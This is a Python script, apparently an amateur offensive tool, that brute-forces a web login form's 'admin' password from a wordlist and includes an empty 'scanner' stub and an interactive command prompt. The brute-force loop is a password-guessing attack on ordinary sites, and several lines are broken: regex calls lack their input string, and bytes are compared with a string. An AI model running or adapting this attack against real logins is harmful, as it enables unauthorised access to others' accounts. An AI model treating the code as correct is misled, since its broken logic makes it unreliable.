'''
    author  : zerobits01
    created : 27-Jan-2020
    purpose : analysing a website for vulns
'''

# we use the crawler that we programmed before and we use
#  our knowledge and programming to automate the process of discovering vulns

import requests
import re
import argparse

'''
    we use the text box's and and params in urls
    to inject some code we should use this app against sites
    that run in SQL so first step is gathering some basic info about that site
'''
parser = argparse.ArgumentParser(description='''
    author : zerobits01
    purpose: vulnerability scanner and brute force
    gmail  : zerobits0101@gmail.com
    team   : Paradox-Squad
''',formatter_class=argparse.RawTextHelpFormatter)

# we can use args too
parser.add_argument('-b','--brute-foce',dest='brute_force',
                        action='store_true',default=False,
                            help='use this switch for bruteforcing a url')
parser.add_argument('-u','--url',
                        help='enter the url for scan or brute force',
                            type=str, required=True)
parser.add_argument('-s','--scan',help='use this switch for scanning the url')

parser.add_argument('-e','--enter',help='enter the program')
# args = parser.parse_args()

target_url = ''
data_dict = {"username":"admin","password":"","Login":"submit"}
passwd_path = ''


# we can also use a word list for username too or entering it manually
def brute_force():
    global passwd_path
    global data_dict
    with open(passwd_path, "r") as wordlist_file:
        i = 1
        for line in wordlist_file:
            print(i)
            word = line.strip()
            data_dict["password"] = word
            response = requests.post(target_url, data=data_dict)
            i = i+1
            if "Login failed" not in response.content:
                print ("[+] Got the Password ----> " + word)
                return
        print("[!] Didn't found.")

def scanner():
    pass

while True:
    cmnd = input('>').strip()
    cmnd = cmnd.lower()

    if cmnd.startswith('set'):
        gp1 = re.match(r'set\s+url\s+(?P<url>\w+)').group('url')
        gp2 = re.match(r'set\s+wordlist\s+(?P<path>\w+)').group('path')
        target_url = gp1 if gp1 is not None else ''
        passwd_path = gp2 if gp2 is not None else ''

    elif cmnd.startswith('start'):
        # TODO : using and handling exceptions
        if re.match(r'start\s+brute-force'):
            brute_force()
        elif re.match(r'start\s+scan'):
            scanner()
        elif re.match(r'show\s+options'):
            print('url : ',target_url)
            print('wordlist : ', passwd_path)
    elif cmnd == 'help':
        help_str = '''
            set  : set the options
                set url example.com
                    if you gonna use bruteforce enter a vulnerable
                        url with variables
                set wordlist /path/to/wordlist
            start: to start scan or brute-force
                start scan
                start brute-force
            show options : prints the options and values
            help : print this help string
        '''
        print(help_str)
    else:
        print('[!] command not found')